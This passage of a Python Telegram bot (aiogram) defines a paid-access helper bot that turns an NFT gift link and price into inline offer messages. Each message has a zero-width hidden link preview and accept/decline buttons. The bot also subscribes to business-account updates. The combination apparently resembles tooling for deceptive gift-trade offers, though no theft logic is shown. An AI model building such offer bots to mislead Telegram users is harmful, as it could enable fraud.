            HELPER_WELCOME_EN,
            reply_markup=markup,
            parse_mode="HTML"
        )

@helper_dp.callback_query(lambda c: c.data == "hmenu_how")
async def helper_how_cb(call: CallbackQuery):
    await call.answer()
    await edit_helper_view(call, HELPER_HOW_EN, helper_back_kb())

@helper_dp.callback_query(lambda c: c.data == "hmenu_rules")
async def helper_rules_cb(call: CallbackQuery):
    await call.answer()
    await edit_helper_view(call, HELPER_RULES_EN, helper_back_kb())

@helper_dp.callback_query(lambda c: c.data == "hmenu_back")
async def helper_back_cb(call: CallbackQuery):
    await call.answer()
    await edit_helper_view(call, HELPER_WELCOME_EN, helper_main_kb())

@helper_dp.callback_query(lambda c: c.data == "hmenu_status")
async def helper_status_cb(call: CallbackQuery):
    await call.answer(HELPER_STATUS_ALERT_EN, show_alert=True)

@helper_dp.inline_query()
async def helper_inline_offer(q: InlineQuery):
    is_admin = q.from_user.id in ADMIN_IDS
    if not (is_admin or await asyncio.to_thread(db.check_paid, q.from_user.id)):
        return await q.answer([], cache_time=1)

    parts = q.query.strip().split()
    if len(parts) < 2:
        return await q.answer([], cache_time=1)

    link, price_str = parts[0], parts[1]
    cur = (parts[2] if len(parts) > 2 else "stars").lower()
    lang = (parts[3] if len(parts) > 3 else "ru").lower()
    if lang not in LOCALIZATIONS:
        lang = "ru"

    match = re.search(r"nft/([a-zA-Z0-9]+)-(\d+)", link)
    if not match or not price_str.replace(".", "", 1).isdigit():
        return await q.answer([], cache_time=1)

    name, num = match.group(1), match.group(2)
    item_title = f"{name}#{num}"
    key = f"{q.from_user.id}_{asyncio.get_event_loop().time()}"
    preview_link = link if "t.me/nft/" in link else f"https://t.me/nft/{name}-{num}"
    if not preview_link.startswith("http"):
        preview_link = "https://" + preview_link

    await asyncio.to_thread(db.save_active_offer, key, preview_link, item_title, q.from_user.id, lang)

    icon = f'<tg-emoji emoji-id="{E_TON}">💎</tg-emoji>' if "gram" in cur else f'<tg-emoji emoji-id="{E_STAR}">⭐</tg-emoji>'
    loc = LOCALIZATIONS[lang]
    text = f'<a href="{preview_link}">&#8203;</a>' + loc["offer_text"].format(
        name=q.from_user.first_name,
        price=price_str,
        icon=icon,
        link=preview_link,
        item_title=item_title
    )
    markup = kb([[
        InlineKeyboardButton(text=loc["btn_dec"], callback_data=f"dec_{key}", icon_custom_emoji_id=E_CROSS),
        InlineKeyboardButton(text=loc["btn_accept"], callback_data=f"acc_{key}", icon_custom_emoji_id=E_CHECK)
    ]])

    await q.answer([InlineQueryResultArticle(
        id=key,
        title=f"Оффер {item_title} ({lang.upper()})",
        description=f"Цена: {price_str} {cur}",
        input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode="HTML",
            link_preview_options={"is_disabled": False, "show_above_text": True, "url": preview_link}
        ),
        reply_markup=markup
    )], cache_time=0)

@helper_dp.callback_query(lambda c: c.data and c.data.startswith(("acc_", "dec_", "confirm_")))
async def helper_offer_action(call: CallbackQuery):
    await render_offer_result(call, helper_bot)

async def main():
    await asyncio.to_thread(db.init_db)
    allowed = ["business_connection", "business_message", "callback_query", "message", "inline_query", "chosen_inline_result"]
    await asyncio.gather(
        dp.start_polling(bot, allowed_updates=allowed),
        helper_dp.start_polling(helper_bot, allowed_updates=allowed)
    )

if __name__ == "__main__":
    asyncio.run(main())
      
